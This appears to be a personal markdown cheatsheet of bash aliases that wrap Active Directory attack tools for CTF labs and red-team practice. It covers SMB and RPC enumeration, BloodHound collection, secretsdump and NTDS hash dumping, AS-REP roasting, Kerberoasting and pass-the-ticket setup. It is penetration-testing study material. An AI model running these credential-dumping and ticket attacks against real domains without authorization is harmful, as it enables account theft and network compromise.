---
tags:
  - "#github"
  - "#type/template"
  - "#markdown"
  - "#notes"
  - "#cheatsheet"
  - "#active-directory"
  - "#ctf"
  - "#windows-enumeration"
  - "#security"
  - "#network-security"
  - "#programming"
  - "#python-scripting"
  - "#opensource"
  - "#red-team"
  - "#penetration-testing"
description:
author:
created: Sunday, June 29th 2025, 12:44:04 am
source:
title: Page 2 - AD
date modified: Sunday, June 29th 2025, 12:44:14 am
---

# Page 2 - AD

**Active Directory (AD)-related aliases** for CTF players doing **Windows domain enumeration**, **Kerberos abuse**, **SMB attacks**, and **privilege escalation**. These are particularly useful for **internal AD labs**, **HTB Active Directory boxes**, and **Red Team simulations**.

---

## 🏢 Active Directory Enumeration & Attacks

```bash
# 🔎 SMB & NetBIOS
smbshare() { smbclient -L "\\\\$1\\" -N; } # Usage: smbshare <target>
smbconnect() { smbclient "\\\\$1\\$2"; } # Usage: smbconnect <target> <share>
smbuser() { smbclient -L "\\\\$1\\" -U "$2"; } # Usage: smbuser <target> <user>
alias enum4='enum4linux-ng -a'
enumuser() { enum4linux -u "$1" -p "$2" -a "$3"; } # Usage: enumuser <username> <password> <target>
alias crackmap='crackmapexec smb'
alias smbmap='smbmap -H'
alias nbtscan='nbtscan -r 10.10.10.0/24'

# 🧠 LDAP & Kerberos
alias kerbrute='python3 ~/tools/kerbrute/kerbrute.py'
alias ldapenum='ldapsearch -x -H ldap://TARGET -s base'
alias adenum='python3 ~/tools/ADEnum/ADEnum.py'
bloodhound() { bloodhound-python -u "$1" -p "$2" -dc-ip "$3" -c all; } # Usage: bloodhound <user> <password> <dc_ip>

# 🗂️ Password & Hash Dumping
secretsdump() { secretsdump.py "$1/$2:$3@$4"; } # Usage: secretsdump <domain> <user> <password> <target>
dumpntds() { secretsdump.py -just-dc "$1/$2:$3@$4"; } # Usage: dumpntds <domain> <user> <password> <dc_ip>
alias hashgrab='impacket-secretsdump'
ridbrute() { rpcclient -U "" "$1" -N -c "enumdomusers"; } # Usage: ridbrute <target>

# 📜 Kerberos Ticket Attacks
asreproast() { GetNPUsers.py "$1/" -usersfile "$2" -no-pass -dc-ip "$3"; } # Usage: asreproast <domain> <users.txt> <target>
kerberoast() { GetUserSPNs.py "$1/$2:$3" -dc-ip "$4" -request; } # Usage: kerberoast <domain> <user> <password> <target>
alias tgt='klist'
renewtgt() { kinit "$1@$2"; } # Usage: renewtgt <username> <domain>
alias ptt='export KRB5CCNAME=FILE:/tmp/krb5cc_1337 && export KRB5_CONFIG=~/krb5.conf'

# 🛠️ Tools & Shortcuts
alias cme='crackmapexec'
alias impacket='cd ~/tools/impacket && source venv/bin/activate'
alias blood='cd ~/tools/BloodHound && neo4j console'
alias neo4jstart='sudo systemctl start neo4j'
alias neo4jstop='sudo systemctl stop neo4j'

# 🪓 Attack Chains
kerbcheck() { nmap --script "krb5-enum-users" -p 88 "$1"; } # Usage: kerbcheck <target>
noauthrpc() { rpcclient -U "" -N "$1"; } # Usage: noauthrpc <target>
authrpc() { rpcclient -U "$1%$2" "$3"; } # Usage: authrpc <user> <password> <target>

# 📚 Active Directory Cheatsheets
alias adhelp='xdg-open https://book.hacktricks.xyz/windows-hardening/active-directory-methodology'
alias privhelp='xdg-open https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation'
```

---

## ✅ Additional Tools Recommended

Make sure you have the following tools installed (some aliases reference them):

- [Impacket](https://github.com/SecureAuthCorp/impacket)
    
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
    
- [Kerbrute](https://github.com/ropnop/kerbrute)
    
- [BloodHound + Neo4j](https://github.com/BloodHoundAD/BloodHound)
    
- [Enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
    
- [ldapsearch (OpenLDAP)](https://linux.die.net/man/1/ldapsearch)
    
- [rpcclient (Samba)](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)

---

## 📥 Install and Activate

To include these in your setup:

### 1. Add to `~/.ctf_aliases` or `.bashrc`/`.zshrc`

```bash
[ -f ~/.ctf_aliases ] && source ~/.ctf_aliases
```

### 2. Then Source It:

```bash
source ~/.ctf_aliases
```

---

## 🧠 Learn More

- [HackTricks: Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
    
- [PayloadsAllTheThings – Windows & AD](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Cheatsheet)
    
- [Red Team Notes by RastaMouse](https://rastamouse.me/)
